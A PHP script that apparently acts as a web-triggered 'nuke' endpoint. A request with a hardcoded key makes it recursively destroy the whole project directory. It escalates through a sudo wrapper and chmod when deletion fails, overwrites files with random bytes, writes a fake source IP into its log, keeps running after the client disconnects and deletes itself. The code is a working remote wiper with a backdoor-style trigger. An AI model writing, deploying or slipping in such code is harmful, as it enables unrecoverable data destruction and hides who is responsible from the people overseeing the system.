<?php
error_reporting(0);
ini_set('display_errors', 0);


$config = [

    'secret_key' => 'Kabooom123!',
    'fake_ip_for_logs' => '127.0.0.1',
    'project_root' => dirname(__DIR__, 2), 
    'wrapper_script' => '/usr/local/bin/emergency-nuke-wrapper.sh',
    'log_file' => '/var/log/emergency-nuke.log',
];
if (!isset($_GET['key']) || $_GET['key'] !== $config['secret_key']) {
    http_response_code(403);
    die('Access denied: Invalid key');
}

set_time_limit(0);
ignore_user_abort(true);

file_put_contents(
    $config['log_file'],
    date('Y-m-d H:i:s') . " - NUKE TRIGGERED from {$config['fake_ip_for_logs']}\n",
    FILE_APPEND
);

function deleteWithFallback($path, $config) {

    if (unlink($path)) {
        file_put_contents($config['log_file'], "DELETED: $path (PHP)\n", FILE_APPEND);
        return true;
    }
    
    if (!file_exists($path)) {
        return true; 
    }
    
    if (!is_writable($path)) {
        file_put_contents($config['log_file'], "UNLINK FAILED - Permission: $path\n", FILE_APPEND);
        
        $escapedPath = escapeshellarg($path);
        $command = "sudo {$config['wrapper_script']} delete $escapedPath 2>&1";
        $output = shell_exec($command);
        
        if (!file_exists($path)) {
            file_put_contents($config['log_file'], "DELETED: $path (SUDO)\n", FILE_APPEND);
            return true;
        }
        
        file_put_contents($config['log_file'], "SUDO WRAPPER FAILED: $path - $output\n", FILE_APPEND);
        

        if (is_writable($path)) {
            return corruptFile($path, $config);
        }
        

        if (chmod($path, 0666)) {
            if (unlink($path)) {
                file_put_contents($config['log_file'], "DELETED: $path (CHMOD+PHP)\n", FILE_APPEND);
                return true;
            }
        }
    }
    
    return false;
}


function corruptFile($path, $config) {
    try {
        $size = filesize($path);
        
        $fp = fopen($path, 'w');
        if ($fp) {
     
            fwrite($fp, random_bytes(min($size, 1024 * 1024)));
            ftruncate($fp, 0);
            fclose($fp);
            
            file_put_contents($config['log_file'], "CORRUPTED: $path\n", FILE_APPEND);

            if (unlink($path)) {
                file_put_contents($config['log_file'], "DELETED AFTER CORRUPT: $path\n", FILE_APPEND);
                return true;
            }
        }
    } catch (Exception $e) {
        file_put_contents($config['log_file'], "CORRUPT FAILED: $path - {$e->getMessage()}\n", FILE_APPEND);
    }
    
    return false;
}

function nukeDirectory($dir, $config) {
    if (!file_exists($dir)) {
        return;
    }
    
    $items = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    
    foreach ($items as $item) {
        $path = $item->getRealPath();
        
        if ($item->isDir()) {

            if (!@rmdir($path)) {
         
                file_put_contents($config['log_file'], "DIR REMOVE FAILED: $path\n", FILE_APPEND);
            }
        } else {

            if ($path === __FILE__) {
                continue;
            }
            
            deleteWithFallback($path, $config);
        }
    }
    

    @rmdir($dir);
}


nukeDirectory($config['project_root'], $config);


if (file_exists(__FILE__)) {
    if (!unlink(__FILE__)) {
        $escapedSelf = escapeshellarg(__FILE__);
        shell_exec("sudo {$config['wrapper_script']} delete $escapedSelf");
    }
}

http_response_code(200);
die('Nuke operation completed. Check logs for details.');